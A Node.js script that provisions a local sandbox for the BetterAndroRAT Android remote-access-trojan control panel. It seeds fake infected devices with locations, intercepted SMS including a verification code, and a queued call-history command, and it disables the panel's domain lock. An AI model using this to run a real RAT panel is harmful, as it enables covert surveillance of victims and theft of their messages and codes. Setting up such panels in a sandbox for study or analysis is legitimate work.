#!/usr/bin/env node
/**
 * Provisions the sandbox: SQLite database, demo data, writable upload
 * directory, panel config.php and the flag that disables the panel's
 * baked-in domain lock.
 *
 * Usage: node provision.mjs [--reset] [--no-seed]
 */
import fs from 'node:fs';
import path from 'node:path';
import crypto from 'node:crypto';
import { fileURLToPath } from 'node:url';

import { PHP, loadPHPRuntime, setPhpIniEntries } from '@php-wasm/universal';
import { getPHPLoaderModule } from '@php-wasm/node-8-3';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const repoRoot = path.resolve(__dirname, '..');
const panelDir = path.join(repoRoot, 'Panel', 'Index');
const dataDir = path.join(repoRoot, 'sandbox', 'data');

const args = new Set(process.argv.slice(2));
const doReset = args.has('--reset');
const doSeed = !args.has('--no-seed');

const adminUser = process.env.ANDRORAT_ADMIN_USER || 'admin';
const adminPass = process.env.ANDRORAT_ADMIN_PASS || crypto.randomBytes(9).toString('base64url');

for (const dir of [dataDir, path.join(dataDir, 'sessions'), path.join(panelDir, 'dlfiles')]) {
  fs.mkdirSync(dir, { recursive: true });
}

const dbPath = path.join(dataDir, 'androrat.sqlite');
const configPath = path.join(panelDir, 'config.php');
const flagPath = path.join(panelDir, 'sandbox.flag');

if (doReset) {
  for (const file of [dbPath, configPath]) {
    if (fs.existsSync(file)) fs.rmSync(file);
  }
  fs.rmSync(path.join(panelDir, 'dlfiles'), { recursive: true, force: true });
  fs.mkdirSync(path.join(panelDir, 'dlfiles'), { recursive: true });
}

const php = new PHP(await loadPHPRuntime(await getPHPLoaderModule()));
php.mkdirTree(repoRoot);
await php.mount(repoRoot, (phpInstance, FS, mountPoint) =>
  FS.mount(FS.filesystems.NODEFS, { root: repoRoot }, mountPoint)
);
php.chdir(panelDir);
await setPhpIniEntries(php, {
  'date.timezone': process.env.TZ || 'UTC',
  'display_errors': '0',
  'log_errors': '0',
  'error_reporting': 'E_ALL & ~E_DEPRECATED & ~E_NOTICE',
});

const schema = fs.readFileSync(path.join(__dirname, 'schema.sql'), 'utf8');
php.mkdirTree('/tmp');
php.writeFile('/tmp/schema.sql', schema);
php.writeFile(
  '/tmp/provision.json',
  JSON.stringify({
    dbPath,
    panelDir,
    configPath,
    flagPath,
    seed: doSeed,
    writeConfig: doReset || !fs.existsSync(configPath),
    adminUser,
    adminPass,
    timezone: process.env.ANDRORAT_TIMEZONE || 'America/Chicago',
  })
);

const result = await php.run({
  code: `<?php
$opts = json_decode(file_get_contents('/tmp/provision.json'), true);
$out = array('actions' => array());

function act(&$out, $msg) { $out['actions'][] = $msg; }

$db = new PDO('sqlite:' . $opts['dbPath']);
$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
$db->exec(file_get_contents('/tmp/schema.sql'));
act($out, 'schema applied to ' . $opts['dbPath']);

// ---------------------------------------------------------------- demo data
if ($opts['seed']) {
  $count = (int) $db->query('SELECT COUNT(*) FROM bots')->fetchColumn();
  if ($count === 0) {
    $now = new DateTime('now', new DateTimeZone('UTC'));
    $bots = array(
      array('355757012345001', 'Verizon Wireless', 32.3792, -86.3077, 'Nexus 5',    '19', '4.4.2', '5550100', 0),
      array('355757012345002', 'AT&T',             41.8781, -87.6298, 'XT1032',     '21', '5.0.1', '5550101', 0),
      array('355757012345003', 'T-Mobile',         47.6062, -122.3321, 'SM-G900V',  '23', '6.0.1', '5550102', 42),
    );
    $stmt = $db->prepare('INSERT INTO bots (uid, provider, lati, longi, device, sdk, version, phone, random, status, "update")
                          VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, 0, ?)');
    foreach ($bots as $b) {
      $ago = (clone $now)->modify('-' . $b[8] . ' minutes');
      $stmt->execute(array($b[0], $b[1], $b[2], $b[3], $b[4], $b[5], $b[6], $b[7], 'demo-' . substr($b[0], -3), $ago->format('Y-m-d H:i:s')));
    }
    act($out, 'seeded 3 demo bots (2 online, 1 idle 42 min)');

    $db->exec("INSERT INTO messages (uid, message) VALUES
               ('355757012345001', '5550134*Ping*me*when*you*get*this'),
               ('355757012345001', '5550134*On*my*way'),
               ('355757012345002', '5550199*Your*verification*code*is*482119')");
    $db->exec("INSERT INTO commands (uid, command, arg1, arg2, arg3) VALUES
               ('355757012345002', 'getcallhistory', '', '', '')");
    act($out, 'seeded demo message history + 1 queued command');

    $demo = 'demo-upload.txt';
    file_put_contents($opts['panelDir'] . '/dlfiles/' . $demo,
      "Sandbox demo file.\\n\\nUploaded files land in Panel/Index/dlfiles/ and are tracked\\nin the \\"files\\" table by the panel's file manager.\\n");
    $db->prepare('INSERT INTO files (uid, file) VALUES (?, ?)')->execute(array('355757012345001', $demo));
    act($out, 'seeded 1 demo uploaded file');
  } else {
    act($out, 'demo data already present, left untouched');
  }
}

// ------------------------------------------------------------------ config
if ($opts['writeConfig']) {
  $cfg  = "<?php\\n";
  $cfg .= "// Generated by sandbox/provision.mjs - safe to delete and re-run setup.\\n";
  $cfg .= "\\$dbhost='localhost';\\n";
  $cfg .= "\\$dbname='androrat';\\n";
  $cfg .= "\\$dbuser='';\\n";
  $cfg .= "\\$dbpass='';\\n";
  $cfg .= "\\$dbdsn='sqlite:" . $opts['dbPath'] . "';\\n";
  $cfg .= "\\$username='" . str_replace("'", "\\\\'", $opts['adminUser']) . "';\\n";
  $cfg .= "\\$password='" . hash('whirlpool', $opts['adminPass']) . "';\\n";
  $cfg .= "\\$postboxtextsize=11;\\n";
  $cfg .= "\\$devicestablerefreshspeed=10000;\\n";
  $cfg .= "\\$filestablerefreshspeed=10000;\\n";
  $cfg .= "\\$messageboxrefreshspeed=3000;\\n";
  $cfg .= "\\$offlineminutes=5;\\n";
  $cfg .= "\\$timezonesetting='" . $opts['timezone'] . "';\\n";
  $cfg .= "\\$autoscrolltextbox=true;\\n";
  $cfg .= "?>\\n";
  file_put_contents($opts['configPath'], $cfg);
  act($out, 'wrote ' . $opts['configPath']);
} else {
  act($out, 'config.php already exists, left untouched (use --reset to replace)');
}

// Disable the panel's hard-coded pizzachip.com domain lock for local use.
if (!file_exists($opts['flagPath'])) {
  file_put_contents($opts['flagPath'], "sandbox\\n");
  act($out, 'wrote ' . $opts['flagPath'] . ' (disables the domain lock)');
}

$out['adminUser'] = $opts['adminUser'];
$out['adminPass'] = $opts['adminPass'];
$out['bots'] = (int) $db->query('SELECT COUNT(*) FROM bots')->fetchColumn();
echo json_encode($out);
`,
});

const parsed = JSON.parse(result.text);
console.log('\nBetterAndroRAT sandbox provisioned');
for (const line of parsed.actions) console.log('  - ' + line);
console.log(`\n  bots in DB : ${parsed.bots}`);
console.log(`  panel URL  : http://localhost:${process.env.PORT || 8080}/`);
console.log(`  login      : ${parsed.adminUser} / ${parsed.adminPass}`);
console.log('\n  Next: cd sandbox && npm start\n');
